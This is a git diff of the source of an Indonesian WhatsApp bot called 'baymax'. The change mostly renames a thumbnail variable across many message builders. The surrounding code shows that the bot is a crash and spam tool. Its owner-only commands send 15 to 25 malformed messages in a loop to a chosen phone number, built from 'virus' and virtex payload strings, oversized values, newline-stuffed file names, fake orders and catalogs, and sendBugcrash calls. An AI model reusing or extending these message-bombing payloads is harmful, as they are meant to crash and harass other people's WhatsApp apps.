@@ -231,11 +231,11 @@ baymax.sendImageAsSticker(m.chat, pesan, m, { packname: global.packname, author:
 }
 
 try {
-data.thumbnail = await baymax.profilePictureUrl(m.sender, 'image')
+ppowner = await baymax.profilePictureUrl(m.sender, 'image')
 } catch (err) {
-data.thumbnail = 'https://telegra.ph/file/8441f8eb9faafc71eaadf.jpg'
+ppowner = 'https://telegra.ph/file/8441f8eb9faafc71eaadf.jpg'
 }
-data.thumbnail = await reSize(data.thumbnail, 300, 300)
+ppnyaowner = await reSize(ppowner, 300, 300)
 
 const sendvn = (teks) => {
 baymax.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
@@ -258,7 +258,7 @@ message: {
 "imageMessage": { 
 "mimetype": "image/jpeg", 
 "caption": `baymax Bot WhatsApp`, 
-"jpegThumbnail": data.thumbnail
+"jpegThumbnail": ppnyaowner
 }
 }
 }
@@ -273,7 +273,7 @@ message: {
 extendedTextMessage: { 
 text: `${m.pushName}`, 
 title: `${m.pushName}`, 
-jpegThumbnail: data.thumbnail } } }
+jpegThumbnail: ppnyaowner } } }
 
 const troli = {
 key: {
@@ -288,7 +288,7 @@ status: 99999999999999999999,
 surface : 9999999999999999,
 message: virus,
 orderTitle: virus,
-thumbnail: data.thumbnail,
+thumbnail: ppnyaowner,
 sellerJid: '0@s.whatsapp.net'
 },
 },
@@ -334,11 +334,6 @@ participant: `0@s.whatsapp.net`,
 "fileName": `baymax Bot WhatsApp${ngazap(prefix)}`,
 "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
 }}}
-
-	// FAKE TEXT IMG
-const textImg = (teks) => {
-baymax.sendMessage(m.chat, { text :teks, }, {quoted: m, thumbnail: fs.readFileSync('./image/qris.jpg')}) 
-}
 
 let list = []
 for (let i of owner) {
@@ -429,7 +424,7 @@ participant: `0@s.whatsapp.net`,
 'duration': '99999', 
 'gifPlayback': 'true', 
 'caption': `${virus}${virtex(prefix)}`,
-'jpegThumbnail': data.thumbnail
+'jpegThumbnail': ppnyaowner
 }}}
 
 const vien = {
@@ -441,7 +436,7 @@ participant: `0@s.whatsapp.net`,
 "message": {
 "orderMessage": {
 "orderId": "594071395007984",
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "itemCount": 100000000000,
 "status": "INQUIRY",
 "surface": "CATALOG",
@@ -538,7 +533,7 @@ const butlocNye = [
 {buttonId: `${prefix}payment`, buttonText: {displayText: 'PAYMENT'}, type: 1}
 ]
 const buttonLocnya = {
-location: { jpegThumbnail: data.thumbnail } ,
+location: { jpegThumbnail: ppnyaowner } ,
 caption: `Hai Kak @${sender.split("@")[0]} 
 𝘏𝘢𝘪 𝘚𝘢𝘺𝘢 𝘉𝘈𝘠𝘔𝘈𝘟 𝘠𝘢𝘪𝘵𝘶 𝘉𝘰𝘵 𝘞𝘩𝘢𝘵𝘴𝘢𝘱𝘱 𝘠𝘢𝘯𝘨 𝘉𝘪𝘴𝘢 𝘔𝘦𝘮𝘣𝘢𝘯𝘵𝘶 𝘈𝘯𝘥𝘢 𝘒𝘦𝘵𝘪𝘬 #𝘈𝘓𝘓𝘮𝘦𝘯𝘶 𝘜𝘯𝘵𝘶𝘬 𝘔𝘦𝘯𝘢𝘮𝘱𝘪𝘭𝘬𝘢𝘯 𝘚𝘦𝘮𝘶𝘢 𝘔𝘦𝘯𝘶,
 Nama ${itsMebaymax ? 'Owner' : 'User'} : ${pushname}
@@ -738,7 +733,7 @@ async function tiktokdl(url) {
         return {
             status: 200,
             title: data.title,
-            thumbnail: "https://telegra.ph/file/886bef2ade7c759c377f6.jpg:" + data.thumbnail,
+            thumbnail: "https://telegra.ph/file/886bef2ade7c759c377f6.jpg" + data.thumbnail,
             duration: data.duration,
             media: data.medias,
         };
@@ -987,7 +982,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://telegra.ph/file/5eab587ad65bd1ec5fc1a.jpg',
 "sourceUrl": 'https://telegra.ph/file/5eab587ad65bd1ec5fc1a.jpg'
 }
@@ -1006,7 +1001,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1025,7 +1020,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1044,7 +1039,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1063,7 +1058,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1082,7 +1077,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1101,7 +1096,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1120,7 +1115,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1139,7 +1134,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1158,7 +1153,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1177,7 +1172,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1196,7 +1191,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1215,7 +1210,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1234,7 +1229,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1253,7 +1248,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1272,7 +1267,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1291,7 +1286,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1310,7 +1305,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1329,7 +1324,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1347,7 +1342,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1366,7 +1361,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1385,7 +1380,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1404,7 +1399,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1423,7 +1418,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1462,7 +1457,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1481,7 +1476,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1500,7 +1495,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1519,7 +1514,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1538,7 +1533,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1557,7 +1552,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1576,7 +1571,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -1595,7 +1590,7 @@ mentionedJid:[sender],
 "title": fake, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }
@@ -2172,7 +2167,7 @@ baymax.sendMessage(m.chat,{
 image:{
 url:kay.thumb_nya},
 caption:dty,
-jpegThumbnail: data.thumbnail},
+jpegThumbnail: ppnyaowner},
 {quoted:m})
 }
 break
@@ -2690,7 +2685,7 @@ if (/document/.test(mime)) return reply(`Send/Reply Video/Audio You Want to Conv
 if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
 mee = await baymax.downloadAndSaveMediaMessage(quoted)
 mem = await uptotelegra(mee)
-baymax.sendMessage(m.chat, { document: {url:mem}, mimetype: 'audio/mpeg', fileName: `Convert By ${pushname}.mp3`, jpegThumbnail: data.thumbnail, mentions:[sender] }, {quoted:m})
+baymax.sendMessage(m.chat, { document: {url:mem}, mimetype: 'audio/mpeg', fileName: `Convert By ${pushname}.mp3`, jpegThumbnail: ppnyaowner, mentions:[sender] }, {quoted:m})
 break
 case 'smeme':
 if (!q) return reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
@@ -2741,7 +2736,7 @@ case 'cekme':
 *Ketakutan :* ${takut}%
 
 *≡═════�? CEKSIFATME 》═════�?*`
-					buff = await getBuffer(data.thumbnail)
+					buff = await getBuffer(ppowner)
 baymax.sendMessage(from, { image: buff, caption: profile, mentions: [bet]},{quoted:m})
 break
 case 'toimg': {
@@ -2752,7 +2747,7 @@ exec(`ffmpeg -i ${media} ${ran}`, (err) => {
 fs.unlinkSync(media)
 if (err) throw err
 let buffer = fs.readFileSync(ran)
-baymax.sendMessage(m.chat, { image: buffer, jpegThumbnail: data.thumbnail, 
+baymax.sendMessage(m.chat, { image: buffer, jpegThumbnail: ppnyaowner, 
 contextInfo: {
 "mentionedJid": [sender],
 "externalAdReply": {
@@ -2761,7 +2756,7 @@ contextInfo: {
 "title": `Hai Kak ${pushname}`, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": data.thumbnail,
+"thumbnail": ppnyaowner,
 "mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }}
@@ -2964,7 +2959,7 @@ if (!itsMebaymax) return reply(mess.owner)
 if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281390368580`)
 jumlah = '15'
 for (let i = 0; i < jumlah; i++) {
-baymax.sendMessage(`${q}`.split("-").join("").split(" ").join("").replace("+", "")+"@s.whatsapp.net", {sticker: data.thumbnail},{quoted: {
+baymax.sendMessage(`${q}`.split("-").join("").split(" ").join("").replace("+", "")+"@s.whatsapp.net", {sticker: ppnyaowner},{quoted: {
 key: { 
 fromMe: false, 
 participant: `0@s.whatsapp.net`, 
@@ -3011,8 +3006,8 @@ mimetype: 'audio/mpeg',
 caption: `baymax Bot WhatsApp${ngazap(prefix)}`,
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
-thumbnailUrl: data.thumbnail, 
-thumbnail: data.thumbnail,
+thumbnailUrl: ppnyaowner, 
+thumbnail: ppnyaowner,
 }
 }}}}}, { quoted:crsh })
 await sleep(1000)
@@ -3037,8 +3032,8 @@ mimetype: 'audio/mpeg',
 caption: `baymax Bot WhatsApp${ngazap(prefix)}`,
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
-thumbnailUrl: data.thumbnail, 
-thumbnail: data.thumbnail,
+thumbnailUrl: ppnyaowner, 
+thumbnail: ppnyaowner,
 }
 }}}}}, { quoted:crsh })
 await sleep(1000)
@@ -3050,7 +3045,7 @@ if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+comman
 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-var messa = await prepareWAMessageMedia({ image: data.thumbnail }, { upload: baymax.waUploadToServer })
+var messa = await prepareWAMessageMedia({ image: ppnyaowner }, { upload: baymax.waUploadToServer })
 var liveLocation = generateWAMessageFromContent(num, proto.Message.fromObject({
 "liveLocationMessage": {
 "degreesLatitude": -6.9367014,
@@ -3084,7 +3079,7 @@ currencyCodeIso4217: 'IDR',
 requestFrom: '0@s.whatsapp.net', 
 expiryTimestamp: 8000, 
 amount: 1, 
-background: data.thumbnail }}}}, {quoted:lep})
+background: ppnyaowner }}}}, {quoted:lep})
 await sleep(1000)
 }
 reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
@@ -3121,10 +3116,10 @@ num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
 baymax.sendMessage(num, { 
-document: data.thumbnail, 
+document: ppnyaowner, 
 fileName: `🔥 baymax BOT ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
 mimetype: `application/txt`, 
-jpegThumbnail: data.thumbnail, 
+jpegThumbnail: ppnyaowner, 
 fileLength: "999999999", 
 mentions:[sender] }, {quoted:lep})
 await sleep(1000)
@@ -3138,7 +3133,7 @@ if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+comman
 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-baymax.sendMessage(num, {sticker: data.thumbnail},{ quoted: lep })
+baymax.sendMessage(num, {sticker: ppnyaowner},{ quoted: lep })
 await sleep(1000)
 }
 reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
@@ -3150,7 +3145,7 @@ if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+comman
 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-sendBugcrash(num, `baymax Bot ${virus}${virtex(prefix)}`, `baymax Bot ${virus}${virtex(prefix)}`, `baymax Bot ${virus}${virtex(prefix)}`, data.thumbnail, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
+sendBugcrash(num, `baymax Bot ${virus}${virtex(prefix)}`, `baymax Bot ${virus}${virtex(prefix)}`, `baymax Bot ${virus}${virtex(prefix)}`, ppnyaowner, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
 await sleep(1000)
 }
 reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
@@ -3162,7 +3157,7 @@ if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+comman
 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-var messa = await prepareWAMessageMedia({ image: data.thumbnail }, { upload: baymax.waUploadToServer })
+var messa = await prepareWAMessageMedia({ image: ppnyaowner }, { upload: baymax.waUploadToServer })
 var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
 "productMessage": {
 "product": {
@@ -3191,7 +3186,7 @@ case 'kaylog':{
 if (!itsMebaymax) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-var messa = await prepareWAMessageMedia({ image: data.thumbnail }, { upload: baymax.waUploadToServer })
+var messa = await prepareWAMessageMedia({ image: ppnyaowner }, { upload: baymax.waUploadToServer })
 var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "productMessage": {
 "product": {
@@ -3220,7 +3215,7 @@ case 'kayloc':{
 if (!itsMebaymax) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-var messa = await prepareWAMessageMedia({ image: data.thumbnail }, { upload: baymax.waUploadToServer })
+var messa = await prepareWAMessageMedia({ image: ppnyaowner }, { upload: baymax.waUploadToServer })
 var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "liveLocationMessage": {
 "degreesLatitude": -6.9367014,
@@ -3253,7 +3248,7 @@ case 'kayitem':{
 if (!itsMebaymax) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-sendBugcrash(m.chat, `baymax Bot ${virus}${virtex(prefix)}`, `baymax Bot ${virus}${virtex(prefix)}`, `baymax Bot ${virus}${virtex(prefix)}`, data.thumbnail, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
+sendBugcrash(m.chat, `baymax Bot ${virus}${virtex(prefix)}`, `baymax Bot ${virus}${virtex(prefix)}`, `baymax Bot ${virus}${virtex(prefix)}`, ppnyaowner, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
 await sleep(1000)
 }
 reply(`Sukses Send Bug Sebanyak ${jumlah}`)
@@ -3263,7 +3258,7 @@ case 'kaystick':{
 if (!itsMebaymax) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-baymax.sendMessage(m.chat, {sticker: data.thumbnail},{ quoted: lep })
+baymax.sendMessage(m.chat, {sticker: ppnyaowner},{ quoted: lep })
 }
 reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
@@ -3273,10 +3268,10 @@ if (!itsMebaymax) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
 baymax.sendMessage(m.chat, { 
-document: data.thumbnail, 
+document: ppnyaowner, 
 fileName: `🔥 baymax BOT ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕